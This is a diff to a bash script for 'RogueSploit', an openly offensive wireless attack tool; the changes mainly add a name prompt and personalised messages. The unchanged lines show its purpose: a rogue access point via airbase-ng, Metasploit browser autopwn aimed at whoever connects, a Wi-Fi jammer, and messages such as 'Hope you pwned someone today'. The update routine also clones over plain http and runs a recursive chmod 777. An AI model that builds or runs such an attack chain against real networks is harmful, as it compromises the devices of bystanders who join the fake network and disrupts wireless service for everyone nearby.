@@ -99,10 +99,15 @@ autopwning2 () {
 	msfconsole -r $(pwd)/roguepwn2.rc
 }
 
+#Welcome Screen
+welcome () {
+myname=$(zenity --entry --title="[*] ROGUESPLOIT [*]" --text=" Input your name or nick :D ");
+zenity --info --title="[*] WELCOME TO ROGUESPLOIT $myname [*]" --text="I am not anyway responsable for the usage of this tool. This tool is intended for legal, study, pentesting, authorized purposes! This tool is shared freely on GitHub, and you can modify it, take it, use it as you want, but remember to mention the author in it." --width=400 --height=40
+}
 #menu1
 menu () {
 clear
-echo -e $yellow"--<"$blue"[*]"$yellow" Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
+echo -e $yellow"--<"$blue"[*]"$yellow" Welcome $myname, this is Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
 echo -e $lightgreen"--<[?] What do you want to do? [?]>-- ";
 echo -e $lightgreen"       1. Start RogueAP"
 echo -e $lightgreen"       2. Start Pwning Services"
@@ -110,8 +115,8 @@ echo -e $lightgreen"       3. Start WiFi Massive Jammer"
 echo -e $lightgreen"       4. Credits"
 echo -e $lightgreen"       5. Exit"
 echo -e $lightgreen"       6. TUTORIAL"
-echo -e $green"       7. Update wit Git"
-echo -ne $yellow"root@roguesploit:"; read answer1
+echo -e $yellow"       7. Update wit Git"
+echo -ne $yellow"$myname@roguesploit:"; read answer1
 
 if test $answer1 == '1'
 	then
@@ -119,10 +124,10 @@ if test $answer1 == '1'
 	pkill airbase-ng
 	pkill airmon-ng
 	pkill dhcpd
-	echo -ne $green"Choose a name for your AP:" ;tput sgr0
-	read nameap
+	nameap=$(zenity --entry --title="Fake AP" --text="Input the name you want to use for the Access Point");tput sgr0
+	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
-	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
+	echo -e $red"[!] $myname YOU NEED WLAN1 INTERFACE FOR THESE [!]"
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
@@ -131,10 +136,10 @@ if test $answer1 == '1'
 elif test $answer1 == '2'
 	then
 	clear
-	echo -e $green"Which AutoPwn do you want? "
+	echo -e $green"Which AutoPwn do you want to start $myname? "
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
-	echo -ne $red"root@pwningservices: ";tput sgr0
+	echo -ne $red"$myname@pwningservices: ";tput sgr0
 	read autopwnans
 	if test $autopwnans == '1'
 		then
@@ -158,7 +163,7 @@ elif test $answer1 == '2'
 			pkill airbase-ng
 			ifconfig at0 down
 			sleep 1
-			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
+			echo -e $yellow"--<[*] Hope you pwned someone today $myname! [*]>--"
 			echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
 			sleep 2
 			clear
@@ -170,18 +175,21 @@ elif test $answer1 == '2'
 	fi
 elif test $answer1 == '3'
 	then
+	echo -e $cyan"Starting massive jamming as you ordered!"
 	python wifijammer.py
 	menu	
 elif test $answer1 == '4'
 	then
 	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
 	echo -e $blue"   Big thanks to:"
+	echo -e $lightgreen"--<[ $myname, a fantastic user! ]>--"
 	echo -e $red"--<[ My friends ]>--"
 	echo -e $green"--<[ GNU / Linux ]>--"
 	echo -e $yellow"--<[ Hackers Elite Group ]>--"
 	echo -e $white"--<[ And averyone who ever supported me ]>--"
 	echo -e $blue" Press any key to continue... "
 	read continuee
+	menu
 elif test $answer1 == '5'
 	then
 	clear
@@ -190,7 +198,7 @@ elif test $answer1 == '5'
 	pkill airmon-ng
 	pkill airbase-ng
 	ifconfig at0 down
-	echo -e $red"Goodbye.."
+	echo -e $red"Goodbye $myname.."
 	sleep 2
 	clear
 	exit
@@ -201,7 +209,7 @@ elif test $answer1 == '6'
 	echo -e $yellow" 2) START THE SCRIPT AND SELECT ROGUE AP (Option 1) ON FIRST TERMINAL;"
 	echo -e $yellow" 3) IN THE SECOND TERMINAL SELECT PWNING SERVICES (Option 2)"
 	echo -e $yellow" 4) THEN JUST WAIT FOR SOMEONE CONNECTING TO YOURE AP AND THEY WILL BE REDIRECTED TO YOUR LOCAL BROWSER_AUTOWPN SERVER!"
-	echo -e $yellow" 5) ENJOY!"
+	echo -e $yellow" 5) Did you understand $myname ?If any problems, or strange things appens, just go here --> https://github.com/B4ckP0r7/RogueSploit/issues and open a new issue!"
 	echo -ne $yellow"Press any key to continue..."
 	read continuos
 	menu
@@ -216,6 +224,7 @@ elif test $answer1 == '7'
 		git clone http://github.com/b4ckp0r7/RogueSploit.git
 		sudo chmod 777 RogueSploit/* -R
 		echo -e $yellow"Update.."; sleep 2; echo -e $lightgreen"* DONE *"
+		echo -e $okegreen"Now $myname just exit RogueSploit directory and comeback and run again RogueSploit!!"
 		exit
 	elif [ $cancel != 'y' ] && [ $cancel != 'Y' ]
 		then
@@ -247,8 +256,9 @@ else
 fi
 }
 #menu2
+welcome
 clear
-echo -e $yellow"--<"$blue"[*]"$yellow" Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
+echo -e $yellow"--<"$blue"[*]"$yellow" Welcome $myname, this is Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
 echo -e $lightgreen"--<[?] What do you want to do? [?]>-- ";
 echo -e $lightgreen"       1. Start RogueAP"
 echo -e $lightgreen"       2. Start Pwning Services"
@@ -256,20 +266,20 @@ echo -e $lightgreen"       3. Start WiFi Massive Jammer"
 echo -e $lightgreen"       4. Credits"
 echo -e $lightgreen"       5. Exit"
 echo -e $lightgreen"       6. TUTORIAL"
-echo -e $green"       7. Update wit Git"
-echo -ne $yellow"root@roguesploit: "; read answer1
+echo -e $yellow"       7. Update wit Git"
+echo -ne $yellow"$myname@roguesploit:"; read answer1
 
 if test $answer1 == '1'
 	then
+	echo -e $yellow"Starting RogueAP"
 	pkill airbase-ng
 	pkill airmon-ng
 	pkill dhcpd
-	echo -e $yellow"Starting RogueAP"
-	echo -ne $green"Choose a name for your AP:" ;tput sgr0
-	read nameap
+	nameap=$(zenity --entry --title="Fake AP" --text="Input the name you want to use for the Access Point");tput sgr0
+	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
-	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
-	sleep 3
+	echo -e $red"[!] $myname YOU NEED WLAN1 INTERFACE FOR THESE [!]"
+	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
 	sudo airbase-ng -e "$nameap" -v wlan1
@@ -277,10 +287,10 @@ if test $answer1 == '1'
 elif test $answer1 == '2'
 	then
 	clear
-	echo -e $green"Which AutoPwn do you want? "
+	echo -e $green"Which AutoPwn do you want to start $myname? "
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
-	echo -ne $red"root@pwningservices: ";tput sgr0
+	echo -ne $red"$myname@pwningservices: ";tput sgr0
 	read autopwnans
 	if test $autopwnans == '1'
 		then
@@ -304,7 +314,7 @@ elif test $answer1 == '2'
 			pkill airbase-ng
 			ifconfig at0 down
 			sleep 1
-			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
+			echo -e $yellow"--<[*] Hope you pwned someone today $myname! [*]>--"
 			echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
 			sleep 2
 			clear
@@ -316,12 +326,14 @@ elif test $answer1 == '2'
 	fi
 elif test $answer1 == '3'
 	then
+	echo -e $cyan"Starting massive jamming as you ordered!"
 	python wifijammer.py
 	menu	
 elif test $answer1 == '4'
 	then
 	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
 	echo -e $blue"   Big thanks to:"
+	echo -e $lightgreen"--<[ $myname, a fantastic user! ]>--"
 	echo -e $red"--<[ My friends ]>--"
 	echo -e $green"--<[ GNU / Linux ]>--"
 	echo -e $yellow"--<[ Hackers Elite Group ]>--"
@@ -337,7 +349,7 @@ elif test $answer1 == '5'
 	pkill airmon-ng
 	pkill airbase-ng
 	ifconfig at0 down
-	echo -e $red"Goodbye.."
+	echo -e $red"Goodbye $myname.."
 	sleep 2
 	clear
 	exit
@@ -348,7 +360,7 @@ elif test $answer1 == '6'
 	echo -e $yellow" 2) START THE SCRIPT AND SELECT ROGUE AP (Option 1) ON FIRST TERMINAL;"
 	echo -e $yellow" 3) IN THE SECOND TERMINAL SELECT PWNING SERVICES (Option 2)"
 	echo -e $yellow" 4) THEN JUST WAIT FOR SOMEONE CONNECTING TO YOURE AP AND THEY WILL BE REDIRECTED TO YOUR LOCAL BROWSER_AUTOWPN SERVER!"
-	echo -e $yellow" 5) ENJOY!"
+	echo -e $yellow" 5) Did you understand $myname ?If any problems, or strange things appens, just go here --> https://github.com/B4ckP0r7/RogueSploit/issues and open a new issue!"
 	echo -ne $yellow"Press any key to continue..."
 	read continuos
 	menu
@@ -363,6 +375,7 @@ elif test $answer1 == '7'
 		git clone http://github.com/b4ckp0r7/RogueSploit.git
 		sudo chmod 777 RogueSploit/* -R
 		echo -e $yellow"Update.."; sleep 2; echo -e $lightgreen"* DONE *"
+		echo -e $okegreen"Now $myname just exit RogueSploit directory and comeback and run again RogueSploit!!"
 		exit
 	elif [ $cancel != 'y' ] && [ $cancel != 'Y' ]
 		then
@@ -383,7 +396,7 @@ else
 		ifconfig at0 down
 		sleep 1
 		echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
-		echo -e $yellow"--<[*] Thank You For Using Roguesploit B) [*]>--"
+		echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
 		sleep 2
 		clear
 		exit
